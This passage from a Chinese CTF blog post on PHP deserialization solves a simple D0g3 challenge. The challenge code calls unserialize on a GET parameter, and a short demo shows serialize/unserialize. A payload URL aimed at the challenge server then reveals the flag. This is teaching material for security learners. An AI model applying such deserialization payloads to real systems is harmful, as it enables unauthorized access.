<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>D0g3平台一道很简单的反序列化的题<br>网址:<a href="http://120.79.33.253:9001/" target="_blank" rel="noopener">http://120.79.33.253:9001/</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">$KEY = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php">$str = $_GET[<span class="string">'str'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure>
<p>原理:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$str = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str1 = serialize($str);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str1;   <span class="comment">// s:7:"D0g3!!!";</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str2 = unserialize($str1);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str2;  <span class="comment">// D0g3!!!</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<pre><code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22
</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/3674#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-0</a><br><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a><br><a href="http://php.net/manual/zh/language.oop5.serialization.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.serialization.php</a><br><a href="https://blog.csdn.net/qq_23937195/article/details/73027557" target="_blank" rel="noopener">https://blog.csdn.net/qq_23937195/article/details/73027557</a><br><a href="http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a><br><a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html</a><br><a href="https://www.anquanke.com/post/id/162300" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162300</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/01/27/php反序列化漏洞入门到放弃/" data-id="cjvrp4glg002k5gqrlqbvttk8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/日记/">日记</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSH/">SSH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日记/">日记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/SSH/" style="font-size: 10px;">SSH</a> <a href="/tags/c/" style="font-size: 10px;">c++</a> <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/代码审计/" style="font-size: 12.5px;">代码审计</a> <a href="/tags/开发/" style="font-size: 17.5px;">开发</a> <a href="/tags/日记/" style="font-size: 10px;">日记</a> <a href="/tags/汇编/" style="font-size: 10px;">汇编</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/05/17/网易云音乐免费下载/">网易云音乐免费下载</a>
          </li>
        
          <li>
            <a href="/2019/05/11/linux学习笔记/">linux学习笔记</a>
          </li>
        
          <li>
            <a href="/2019/05/11/docker学习/">docker学习</a>
          </li>
        
          <li>
            <a href="/2019/05/08/test/">test</a>
          </li>
        
          <li>
            <a href="/2019/04/19/PHP-sprintf格式化字符串漏洞/">PHP sprintf格式化字符串漏洞</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 筱阳<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>